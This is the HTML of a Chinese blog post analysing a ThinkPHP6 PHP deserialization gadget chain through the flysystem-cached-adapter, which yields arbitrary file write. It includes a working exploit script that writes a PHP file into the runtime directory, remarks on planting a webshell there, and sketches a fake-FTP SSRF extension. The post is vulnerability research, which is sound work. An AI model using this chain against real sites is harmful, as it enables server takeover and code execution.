@@ -1,0 +1,1595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'G-V3C5GQ73TE');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?x";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
+  <meta name="keyword" content="Morouu,morouu"/>
+  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="https://morblog.cc/posts/1675626419/">
+  <title>
+    
+      漏洞挖掘 - thinkphp6序列化链(一) - Morouu的大狗窝 ●&#39;◡&#39;●
+    
+  </title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--light">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'light';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+		<!-- Gitter -->
+<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'dmantick/morcruiser'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">首页</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              分类
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>搜索</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+          
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
+      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201201608302.jpeg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201201608302.jpeg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201201608302.jpeg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201201608302.jpeg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201201608302.jpeg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#安全" title="安全">安全</a>
+              
+              <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
+              
+              <a class="tag" href="/tags/#php" title="php">php</a>
+              
+            </div>
+            <h1>漏洞挖掘 - thinkphp6序列化链(一)</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by morouu on
+              2022-01-20
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count" >31</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">7.1k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container" style="margin-left: 10%;">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h1>漏洞挖掘 - thinkphp6序列化链(一)</h1>
+<hr>
+<h2 id="前言">- 前言 -</h2>
+<p>这两天一直在跟好兄弟WaY搞php免杀🐎绕过，虽然说学到了不少新特性啥的，就是没怎么进行对以前知识的总结了，对此很是惭愧(没想到去年无聊找的另类参数传入方式竟然起了奇效)，那么现在该静下心稍微总结一些 <code>thinkphp6</code> 的一些序列化链条吧，没准以后会用得上。</p>
+<h2 id="目的">- 目的 -</h2>
+<p>说到 <code>thinkphp6</code> 的序列化链条，如果是为了能够进行任意代码执行，其最后都是为了同一个目标，那就是找到形如 <code>[可控](可控)</code> 的动态函数调用形式，并且第一个可控的内容必须是数组。因为在 <code>thinkphp6</code> 中，或许可以说是几乎所有版本的 <code>thinkphp</code> 中都有 <code>Php</code> 这个类，而在这个 <code>Php</code> 类中，拥有一个名为 <code>display</code> 的方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118142905915.png" alt="image-20220118142905915"></p>
+<p>所以说，能够达到 <code>[可控](可控)</code> 或 <code>[可控](可控,可控)</code> 的形式即是能够进行任意代码执行的关键。</p>
+<p>不过事实上这只是为了单纯执行任意代码的角度来看，实际能够进行一些其他间接执行任意代码的方式也是可以的，比如文件写入，文件包含之类的。</p>
+<p>那么下面不妨就根据序列化链条的路口作为大类接着各个链条来分析说明。</p>
+<h2 id="入口一">- 入口一 -</h2>
+<p>首先还是万能开头 <code>__destruct</code> 方法作为入口，这里选的是在 <code>vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 文件中 <code>AbstractCache</code> 抽象类的 <code>__destruct</code> 方法，显然 <code>$this-&gt;autosave</code> 是可控的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118144625066.png" alt="image-20220118144625066"></p>
+<p>其中 <code>AbstractCache</code> 是一个实现了 <code>CacheInterface</code> 接口的抽象类👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118144736322.png" alt="image-20220118144736322"></p>
+<p>接下来全局搜索实现了这个 <code>AbstractCache</code> 抽象类的子类，并且着重观察每一个的 <code>save</code> 方法，实际上这里是可以衍生出许多链条的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118150658185.png" alt="image-20220118150658185"></p>
+<p>接下来即是对这个入口能达成的各个链条具体分析了。</p>
+<h3 id="链条I-任意文件写入">- 链条I (任意文件写入) -</h3>
+<h4 id="终点">- 终点 -</h4>
+<p>最终可写入任意文件形式的调用在 <code>vendor/league/flysystem/src/Adapter/Local.php</code> 文件中  <code>Local</code> 类的 <code>write</code> 方法里👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118151118450.png" alt="image-20220118151118450"></p>
+<h4 id="分析">- 分析 -</h4>
+<p>这里来看实现 <code>AbstractCache</code> 抽象类存在 <code>vendor/league/flysystem-cached-adapter/src/Storage/Adapter.php</code> 文件中的 <code>Adapter</code> 子类，其 <code>save</code> 方法中有一个 <code>$this-&gt;[可控]-&gt;write(可控,可控,&#123;Config&#125;可控)</code> 的形式 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118151918144.png" alt="image-20220118151918144"></p>
+<p>不妨对这个方法的各个语句进行分析，其中 <code>$config = new Config()</code> 这条语句是实例化了 <code>Config</code> 类，而跟进这个类可以发现 <code>Config</code> 类的构造方法仅仅是为自己的属性进行初始化罢👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118152225898.png" alt="image-20220118152225898"></p>
+<p>再看 <code>$contents = $this-&gt;getForStorage()</code> 这条语句，跟进 <code>getForStorage</code> 方法，会将自身的 <code>cache</code> 属性作为参数去调用自身 <code>cleanContents</code> 方法，再把得到的值与自身的 <code>complete</code> 以及 <code>expire</code> 属性合并成一个数组并打包返回其的一串json字符👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118175459812.png" alt="image-20220118175459812"></p>
+<p>由此跟进 <code>cleanContents</code> 方法，这里假设将其 <code>cache</code> 属性通过序列化控制成 <code>空数组</code> ，其实也就和 <code>$cleaned = [] </code>没啥两样了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118153039797.png" alt="image-20220118153039797"></p>
+<p>实际上 <code>cache</code> 属性默认值是为 <code>空数组的</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118174848719.png" alt="image-20220118174848719"></p>
+<p>再回到 <code>save</code> 方法，继续看下一条语句，即条件判断 <code>if($this-&gt;adapter-&gt;has($this-&gt;file))</code> ，显然 <code>$this-&gt;file</code> 是可控的且为了达成终点，这里的 <code>$this-&gt;adapter</code> 的值必须控制为 <code>Local</code> 类，由此跟进 <code>Local</code> 类查看其 <code>has</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118154305920.png" alt="image-20220118154305920"></p>
+<p>看起来仅是对传入的内容做一个该路径是否存在文件的判断，为了能让其执行 <code>$this-&gt;adapter-&gt;write($this-&gt;file, $contents, $config)</code> ，只需要传入一个文件不存在的文件名即可。其实即便是传入的文件名存在也仅是执行了 <code>$this-&gt;adapter-&gt;update($this-&gt;file, $contents, $config)</code> ，这个 <code>update</code> 方法本质上和 <code>write</code> 方法都可实现同一个目标，也就是说都可以进行任意文件写入👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118154745334.png" alt="image-20220118154745334"></p>
+<p>不过一般来说如果要写入文件就是因为文件不存在所以才要写嘛，这里就选择 <code>write</code> 方法了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118155407712.png" alt="image-20220118155407712"></p>
+<p>这一看一下就明了了，不过如果说为了保险继续跟进 <code>ensureDirectory</code> 方法，可以发现只不过是在写入文件前进行的一个目录创建👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118155606795.png" alt="image-20220118155606795"></p>
+<p>由此整条任意写入文件的链条就结束了，这条链是非常简短的，以下是该链条的简单类示意👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__dustrcut</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$contents</span>, Config <span class="variable">$config</span></span>)</span>&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="exp-动调">- exp&amp;动调 -</h4>
+<p>先上 <code>exp</code> 👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">ReadInterface</span>&#123;&#125;</span><br><span class="line">	<span class="title">interface</span> <span class="title">AdapterInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">ReadInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">interface</span> <span class="title">CacheInterface</span> <span class="keyword">extends</span> <span class="title">ReadInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">AdapterInterface</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span></span>&#123;&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">CacheInterface</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">Local</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$contents</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adapter = <span class="keyword">new</span> Local;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;expire = <span class="variable">$contents</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> Adapter(<span class="string">&#x27;../runtime/log/a.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 <code>thinkphp</code> 中， <code>runtime</code> 是可以任意写的，也就可以把🐎写到那儿。</p>
+<p>那么接下来对 <strong>exp</strong> 进行调试分析，先是入口处👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118200547395.png" alt="image-20220118200547395"></p>
+<p>继续跟进 <code>League\Flysystem\Cached\Storage\Adapter</code> 类的 <code>save</code> 方法，先是获取一个 <code>Config</code> 的实例👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118201207172.png" alt="image-20220118201207172"></p>
+<p>接着调用 <code>getForStorage</code> 方法，跟进它👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118201600837.png" alt="image-20220118201600837"></p>
+<p>继续跟进 <code>has</code> 方法，此时来到 <code>League\Flysystem\Adapter\Local</code> 类👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118202328414.png" alt="image-20220118202328414"></p>
+<p>显然，这个文件肯定是不存在的，那么下一步即是执行到对 <code>write</code> 方法的调用了，此时 <code>$config</code> 以及 <code>$contents</code> 变量的值为👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118202542018.png" alt="image-20220118202542018"></p>
+<p>继续跟进 <code>League\Flysystem\Adapter\Local</code>  类的 <code>write</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118203023431.png" alt="image-20220118203023431"></p>
+<p>此时再检查一下目录，可以发现确实是有相应的文件被写入👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118203212368.png" alt="image-20220118203212368"></p>
+<p>链条I的分析先到这里。</p>
+<h4 id="调用栈">- 调用栈 -</h4>
+<ul>
+<li><code>Local.php:135, League\Flysystem\Adapter\Local-&gt;write()</code></li>
+<li><code>Adapter.php:112, League\Flysystem\Cached\Storage\Adapter-&gt;save()</code></li>
+<li><code>AbstractCache.php:31, League\Flysystem\Cached\Storage\Adapter-&gt;__destruct()</code></li>
+</ul>
+<h4 id="扩展">- 扩展 -</h4>
+<p>另外，由于这是一个几乎完全可控的 <code>file_put_contents</code> 函数，假若能够配合外网的 <code>fakeftp</code> 服务就可以达到无回显的 <code>SSRF</code> ，不过有一点需要注意，就是这个 <code>fakeftp</code> 服务必须在对 <code>file_exists</code> 函数进行判断是回应文件是存在的，否则会在新建目录那里抛出错误。</p>
+<p>不妨先监听查看一下在执行 <code>file_exists</code> 函数时，对 <code>ftp</code> 的交互内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120152540578.png" alt="image-20220120152540578"></p>
+<p>根据上面的交互内容，实际上只需要回应以下内容即可👇</p>
+<ul>
+<li><code>220 \r\n</code></li>
+<li><code>331 \r\n</code></li>
+<li><code>230 \r\n</code></li>
+<li><code>550 \r\n</code></li>
+<li><code>200 \r\n</code></li>
+<li><code>213 \r\n</code></li>
+<li><code>213 \r\n</code></li>
+</ul>
+<p>可以模拟一下交互👇</p>
